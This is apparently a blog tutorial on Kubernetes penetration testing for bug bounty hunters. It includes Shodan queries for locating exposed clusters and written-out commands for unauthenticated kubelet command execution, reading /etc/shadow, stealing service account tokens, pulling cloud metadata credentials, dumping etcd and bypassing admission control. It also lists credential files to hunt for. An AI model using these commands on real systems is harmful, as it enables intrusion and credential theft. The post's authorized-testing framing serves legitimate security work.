# The Complete Guide to Kubernetes Penetration Testing: Tools, Techniques, and Wordlists for Bug Bounty Hunters

![Kubernetes Security](https://images.unsplash.com/photo-1558494949-ef010cbdcc31)

## Introduction

Kubernetes has become the de facto standard for container orchestration, powering everything from startups to Fortune 500 companies. With great power comes great responsibility — and unfortunately, great security risks. As a penetration tester or bug bounty hunter, understanding how to properly assess Kubernetes infrastructure is crucial in today's cloud-native world.

In this comprehensive guide, I'll walk you through the essential tools, techniques, and wordlists needed to perform effective Kubernetes penetration testing. Whether you're just starting in bug bounty or looking to expand your cloud security skills, this guide has you covered.

## Why Kubernetes Security Matters

Before diving into the technical details, let's understand why Kubernetes security is so critical:

- **Widespread Adoption**: Over 5.6 million developers use Kubernetes globally
- **Attack Surface**: Kubernetes exposes multiple APIs, ports, and services
- **Misconfiguration**: 91% of organizations experienced Kubernetes misconfigurations in 2024
- **High-Value Targets**: Kubernetes clusters often contain sensitive data and critical workloads
- **Bug Bounty Gold**: Major programs pay premium bounties for Kubernetes vulnerabilities

## The Kubernetes Attack Surface

Understanding what to target is the first step in any security assessment. Here are the key components:

### Critical Ports to Probe

| Port Range | Service | Risk Level |
|------------|---------|------------|
| 6443 | API Server (HTTPS) | 🔴 Critical |
| 8080 | API Server (HTTP) | 🔴 Critical |
| 10250 | Kubelet API | 🔴 Critical |
| 10255 | Kubelet Read-Only | 🟡 High |
| 2379-2380 | etcd | 🔴 Critical |
| 30000-32767 | NodePort Services | 🟡 Medium |

### Common Exposed Endpoints

When you discover a Kubernetes cluster, these are the first endpoints to check:

```
/api/v1
/apis
/version
/healthz
/metrics
/logs
```

Many clusters have anonymous access enabled by default, allowing you to enumerate resources without authentication!

## Essential Tools for Kubernetes Penetration Testing

### 1. kubectl - Your Swiss Army Knife

The official Kubernetes CLI is your primary tool for interaction. Here's how to use it for reconnaissance:

```bash
# Test anonymous access
kubectl --insecure-skip-tls-verify \
  --server=https://target.com:6443 get pods

# Enumerate all resources
kubectl get all --all-namespaces

# Check your permissions
kubectl auth can-i --list

# Hunt for secrets
kubectl get secrets --all-namespaces -o yaml | grep -i password
```

**Pro Tip**: Always check `kubectl auth can-i --list` first to understand what actions you're allowed to perform.

### 2. kubeletctl - The Kubelet Exploitation Framework

The kubelet is often the weakest link in Kubernetes security. kubeletctl makes exploitation straightforward:

```bash
# Installation
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64

# Scan for vulnerable kubelets
kubeletctl scan --cidr 10.0.0.0/24

# Execute commands in containers
kubeletctl exec "cat /etc/shadow" -s target-ip
```

**Real-World Finding**: I've discovered numerous exposed kubelet APIs on port 10250 that allowed unauthenticated command execution. This is a critical vulnerability that often goes unnoticed.

### 3. kube-hunter - Automated Vulnerability Scanning

Developed by Aqua Security, kube-hunter is perfect for initial reconnaissance:

```bash
# Remote scanning
kube-hunter --remote target.com

# Network scanning
kube-hunter --cidr 10.0.0.0/24

# Active hunting (get permission first!)
kube-hunter --active
```

### 4. kubeaudit - Configuration Assessment

Finding misconfigurations is often easier than finding zero-days:

```bash
# Audit everything
kubeaudit all

# Specific checks
kubeaudit privileged  # Find privileged containers
kubeaudit nonroot     # Check for root users
kubeaudit caps        # Dangerous capabilities
```

### 5. peirates - Container Escape & Privilege Escalation

Once you're inside a pod, peirates helps you move laterally:

- Service account token theft
- Network scanning from inside the cluster
- Container escape techniques
- Cloud metadata service exploitation

## Online Reconnaissance: Finding Kubernetes Clusters

### Shodan Queries That Actually Work

Shodan is gold for finding exposed Kubernetes infrastructure. Here are my go-to queries:

```
# Basic Kubernetes search
"kubernetes" port:6443

# Exposed dashboards
http.favicon.hash:-1048180861

# Insecure API servers
"kubernetes" port:8080

# Exposed kubelets
"kubernetes" port:10250

# SSL certificate search
ssl:"Kubernetes"
```

**Bug Bounty Tip**: Many organizations don't realize their Kubernetes clusters are exposed. A simple Shodan search can uncover low-hanging fruit.

### Other Search Engines

Don't limit yourself to Shodan:

- **Censys**: Better for SSL certificate searches
- **Binary Edge**: Great for Asian infrastructure
- **ZoomEye**: Chinese alternative with unique results
- **Fofa**: Often finds systems missed by Western engines

### Certificate Transparency Logs

Use crt.sh to find Kubernetes-related subdomains:

```
%.kubernetes.company.com
%.k8s.company.com
%master%.company.com
%node%.company.com
```

## The Ultimate Kubernetes Penetration Testing Wordlist

After years of testing Kubernetes environments, I've compiled a wordlist of 500+ paths, files, and endpoints commonly found in Kubernetes deployments. This wordlist includes:

### API Endpoints (100+ paths)
```
api/v1
api/v1/namespaces
api/v1/namespaces/default/pods
api/v1/namespaces/kube-system/secrets
apis/apps/v1/deployments
```

### Sensitive Files (150+ patterns)
```
.kube/config
.kube/config.bak
/etc/kubernetes/admin.conf
/var/run/secrets/kubernetes.io/serviceaccount/token
id_rsa
```

### Configuration Files (100+ variants)
```
config.yaml
deployment.yaml
values.yaml
secrets.yaml
Chart.yaml
```

### Service Discovery Paths
```
.well-known/openid-configuration
/metrics
/healthz
/readyz
/livez
```

This wordlist is perfect for tools like:
- **ffuf**: `ffuf -w wordlist.txt -u https://target.com/FUZZ`
- **gobuster**: `gobuster dir -w wordlist.txt -u https://target.com`
- **dirsearch**: `dirsearch -w wordlist.txt -u https://target.com`

## The 5-Phase Reconnaissance Methodology

### Phase 1: Discovery

Start by identifying Kubernetes infrastructure:

```bash
# Subdomain enumeration
subfinder -d target.com | grep -E '(k8s|kube|kubernetes|master|node)'

# Port scanning
nmap -p 6443,8080,10250,10255,2379,30000-32767 target.com

# HTTP service detection
httpx -l subdomains.txt -ports 6443,8080,10250
```

### Phase 2: Information Gathering

Once you find Kubernetes endpoints, gather as much information as possible:

```bash
# Test anonymous API access
curl -k https://target.com:6443/api/v1
curl -k https://target.com:6443/version

# Check kubelet endpoints
curl -k https://target.com:10250/pods
curl http://target.com:10255/metrics

# Look for exposed dashboards
curl -k https://target.com/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/
```

**What to Look For**:
- Version information (older versions have known CVEs)
- Namespace names (often reveal application structure)
- Service accounts and their permissions
- Exposed metrics containing sensitive data

### Phase 3: Authentication Testing

Try various authentication methods:

```bash
# Anonymous access
kubectl --insecure-skip-tls-verify --server=https://target.com:6443 get pods

# Default credentials (rarely works, but worth trying)
kubectl --username=admin --password=admin get pods

# Token-based auth
curl -k https://target.com:6443 -H "Authorization: Bearer <token>"
```

**Pro Tip**: If you find a service account token inside a container, it might have cluster-admin privileges!

### Phase 4: Vulnerability Scanning

Automated scanning can uncover quick wins:

```bash
# Run kube-hunter
kube-hunter --remote target.com

# Scan with kubeletctl
kubeletctl scan rhost target.com

# Configuration audit
kubeaudit all

# CVE scanning
trivy k8s --report summary cluster
```

### Phase 5: Exploitation & Impact Assessment

If you find vulnerabilities, demonstrate impact responsibly:

1. **Document permissions**: Show exactly what you can access
2. **Prove RCE**: Execute `whoami` or `id` commands
3. **Show data access**: List secrets or configmaps (don't exfiltrate)
4. **Demonstrate lateral movement**: Show you can pivot to other pods
5. **Assess cloud impact**: Check if you can access cloud metadata services

## Common Kubernetes Vulnerabilities for Bug Bounty

### 1. Exposed Kubernetes Dashboard

**Severity**: Critical  
**Bounty Range**: $500 - $5,000

The Kubernetes Dashboard is a web-based UI for managing clusters. When exposed without authentication, it's game over.

**How to Find**:
```bash
# Shodan
http.favicon.hash:-1048180861

# Direct access
https://target.com/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/
```

**Impact**: Full cluster compromise, data exfiltration, crypto mining, lateral movement to cloud infrastructure.

### 2. Unauthenticated Kubelet API

**Severity**: Critical  
**Bounty Range**: $1,000 - $10,000

The kubelet API on port 10250 can allow command execution in containers without authentication.

**How to Test**:
```bash
kubeletctl scan rhost target.com
kubeletctl pods -s target.com
kubeletctl exec "whoami" -s target.com -p <pod> -c <container>
```

### 3. Anonymous API Access

**Severity**: High  
**Bounty Range**: $500 - $3,000

Many clusters allow anonymous users to list resources.

**Quick Check**:
```bash
curl -k https://target.com:6443/api/v1/namespaces
```

If you see JSON data instead of an authentication error, you've found anonymous access.

### 4. Secrets in ConfigMaps

**Severity**: Medium-High  
**Bounty Range**: $300 - $2,000

Developers often mistakenly store secrets in ConfigMaps instead of Secrets objects.

**How to Find**:
```bash
kubectl get configmaps --all-namespaces -o yaml | grep -iE '(password|token|key|secret|api)'
```

### 5. Overly Permissive RBAC

**Severity**: High  
**Bounty Range**: $500 - $5,000

Service accounts with excessive permissions enable privilege escalation.

**Check With**:
```bash
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
```

### 6. Container Escape via Privileged Pods

**Severity**: Critical  
**Bounty Range**: $2,000 - $15,000

Privileged containers can escape to the host system.

**Identify With**:
```bash
kubectl get pods --all-namespaces -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged==true)'
```

### 7. Exposed etcd

**Severity**: Critical  
**Bounty Range**: $5,000 - $20,000

etcd stores all cluster data, including secrets. Unauthenticated access = complete compromise.

**How to Test**:
```bash
curl -L http://target.com:2379/v2/keys
etcdctl --endpoints=http://target.com:2379 get / --prefix
```

## Real-World Bug Bounty Case Studies

### Case Study 1: The $5,000 Dashboard Discovery

While testing a financial services company, I discovered their Kubernetes Dashboard was exposed on a subdomain `k8s-admin.company.com`. No authentication required.

**Steps**:
1. Found subdomain using subfinder
2. Accessed dashboard directly
3. Created a privileged pod
4. Escaped to host node
5. Accessed cloud metadata service
6. Demonstrated AWS account compromise

**Payout**: $5,000 + Bonus

### Case Study 2: The Kubelet RCE

A tech company had port 10250 exposed on their node IPs, discoverable through Shodan.

**Steps**:
1. Found exposed kubelet via Shodan query: `"kubernetes" port:10250`
2. Used kubeletctl to list pods
3. Executed commands in running containers
4. Extracted database credentials from environment variables

**Payout**: $8,500

### Case Study 3: The Anonymous API Goldmine

A SaaS platform had their API server on port 8080 with no authentication.

**Steps**:
1. Discovered via port scan
2. Listed all secrets: `curl http://target.com:8080/api/v1/secrets`
3. Found AWS credentials, database passwords, API keys
4. Demonstrated impact on test data only

**Payout**: $3,000

## Best Practices for Responsible Disclosure

When testing Kubernetes infrastructure:

1. **Always Get Permission**: Test only in-scope targets
2. **Don't Exfiltrate Data**: Demonstrate access, don't download secrets
3. **Avoid Denial of Service**: Don't delete resources or crash services
4. **Test in Isolation**: Use separate test pods, don't interfere with production
5. **Document Everything**: Screenshots, commands, timestamps
6. **Report Quickly**: Security teams need to patch ASAP
7. **Follow Up**: Offer to help verify fixes

## Essential Files to Hunt For

When you gain filesystem access in a Kubernetes environment, look for these high-value files:

```
# Service Account Tokens
/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/token

# Kubernetes Configs
/etc/kubernetes/admin.conf
/etc/kubernetes/kubelet.conf
/root/.kube/config
/home/*/.kube/config

# SSH Keys
/root/.ssh/id_rsa
/home/*/.ssh/id_rsa
/.ssh/authorized_keys

# Environment Files
/.env
/.env.local
/.env.production

# Cloud Provider Credentials
/root/.aws/credentials
/root/.azure/credentials
/root/.config/gcloud/
```

## Environment Variables of Interest

Check these environment variables when inside a container:

```bash
# Kubernetes Service Discovery
echo $KUBERNETES_SERVICE_HOST
echo $KUBERNETES_SERVICE_PORT

# Database Connections
env | grep -i database
env | grep -i mysql
env | grep -i postgres

# API Keys and Tokens
env | grep -i api
env | grep -i token
env | grep -i secret
env | grep -i key

# Cloud Metadata
curl http://169.254.169.254/latest/meta-data/
```

## Building Your Kubernetes Testing Lab

Before testing in the wild, practice in a safe environment:

### 1. Kubernetes Goat
Intentionally vulnerable Kubernetes cluster for learning.
```bash
git clone https://github.com/madhuakula/kubernetes-goat
cd kubernetes-goat
bash setup-kubernetes-goat.sh
```

### 2. Local Minikube Cluster
```bash
# Install minikube
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
sudo install minikube-linux-amd64 /usr/local/bin/minikube

# Start cluster
minikube start

# Deploy vulnerable apps
kubectl apply -f vulnerable-app.yaml
```

### 3. Kind (Kubernetes in Docker)
```bash
# Install kind
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.20.0/kind-linux-amd64
chmod +x ./kind
sudo mv ./kind /usr/local/bin/kind

# Create cluster
kind create cluster --name testing
```

## Advanced Techniques

### Token Theft and Reuse

Every pod has a service account token mounted by default:

```bash
# From inside a pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use the token externally
kubectl --token="<stolen-token>" --server=https://api-server:6443 get pods
```

### Container Escape via Hostpath Mounts

Check for dangerous volume mounts:

```bash
kubectl get pods -o json | jq '.items[].spec.volumes[] | select(.hostPath != null)'
```

If you find a hostPath mount to `/`, `/etc`, or `/var`, you can access the host filesystem.

### Abusing Admission Controllers

Bypassing admission controllers can allow deploying malicious workloads:

```bash
# Check for admission controllers
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# Look for bypasses in namespaces
kubectl label namespace default admission.disabled=true
```

### Cloud Metadata Service Exploitation

From within a Kubernetes pod, you can often access cloud metadata:

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# GCP
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

## Tools Cheat Sheet

Here's a quick reference for your penetration testing toolkit:

| Tool | Best For | Command Example |
|------|----------|-----------------|
| kubectl | General cluster interaction | `kubectl get pods --all-namespaces` |
| kubeletctl | Kubelet exploitation | `kubeletctl exec "whoami" -s <ip>` |
| kube-hunter | Automated scanning | `kube-hunter --remote <target>` |
| kubeaudit | Config auditing | `kubeaudit all` |
| kube-bench | CIS benchmark check | `kube-bench run` |
| trivy | Vulnerability scanning | `trivy k8s cluster` |
| peirates | Post-exploitation | Interactive menu |
| kubectl-who-can | RBAC analysis | `kubectl who-can get secrets` |

## Reporting Templates

### Finding Template

```markdown
## Title: Unauthenticated Kubernetes API Access

### Severity: Critical

### Description:
The Kubernetes API server at https://api.company.com:6443 allows anonymous 
access to cluster resources without authentication.

### Steps to Reproduce:
1. Navigate to https://api.company.com:6443/api/v1/namespaces
2. Observe successful response without credentials
3. Execute: `kubectl --insecure-skip-tls-verify --server=https://api.company.com:6443 get pods`

### Impact:
- Full cluster resource enumeration
- Potential privilege escalation via RBAC misconfigurations
- Access to sensitive secrets and configmaps
- Ability to deploy malicious workloads

### Recommendation:
1. Disable anonymous authentication: `--anonymous-auth=false`
2. Implement proper RBAC policies
3. Use authentication mechanisms (certificates, tokens, OIDC)
4. Audit existing permissions

### References:
- https://kubernetes.io/docs/reference/access-authn-authz/authentication/
- CWE-306: Missing Authentication for Critical Function
```

## Resources for Continued Learning

### Official Documentation
- [Kubernetes Security Documentation](https://kubernetes.io/docs/concepts/security/)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/)

### Security Frameworks
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
- [NSA Kubernetes Hardening Guide](https://www.nsa.gov/Press-Room/News-Highlights/Article/Article/2716980/)

### Practice Platforms
- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat)
- [KubeCon Security Workshops](https://www.youtube.com/kubecon)
- [Kubernetes the Hard Way](https://github.com/kelseyhightower/kubernetes-the-hard-way)

### Communities
- r/kubernetes
- Kubernetes Slack (#security channel)
- Bug Bounty Forum (Kubernetes tag)

## Conclusion

Kubernetes security testing offers tremendous opportunities for bug bounty hunters willing to invest time in understanding the platform. The combination of widespread adoption, complex architecture, and frequent misconfigurations creates a target-rich environment.

Key takeaways:

1. **Start with reconnaissance**: Use search engines and port scanning to find targets
2. **Use the right tools**: kubectl, kubeletctl, and kube-hunter are essential
3. **Leverage the wordlist**: 500+ paths to help you discover hidden endpoints
4. **Understand the architecture**: Know how Kubernetes components interact
5. **Practice safely**: Use labs before testing production systems
6. **Report responsibly**: Focus on impact, provide clear remediation

Remember: The best bug bounty hunters don't just find vulnerabilities—they understand the underlying systems and can articulate business impact. Kubernetes is complex, but with this guide, you have everything you need to start hunting.

Happy hacking, and stay ethical! 🔐

---

## About the Wordlist and Tools

All the tools, techniques, and the complete 500+ entry wordlist mentioned in this article are available in my [Kubernetes Penetration Testing GitHub repository](https://github.com/blackkhawkk/Kubernetes_Penetration_Testing). Feel free to star, fork, and contribute!

## Legal Disclaimer

This guide is for educational purposes and authorized security testing only. Always obtain proper written permission before testing any systems you do not own. Unauthorized access to computer systems is illegal and punishable under laws including the Computer Fraud and Abuse Act (CFAA) and similar international laws.

---

*If you found this guide helpful, please clap 👏 and share it with other security researchers. Follow me for more content on cloud security, bug bounty, and penetration testing!*

---

**Tags**: #Kubernetes #BugBounty #PenetrationTesting #CloudSecurity #CyberSecurity #InfoSec #K8s #ContainerSecurity #EthicalHacking #DevSecOps
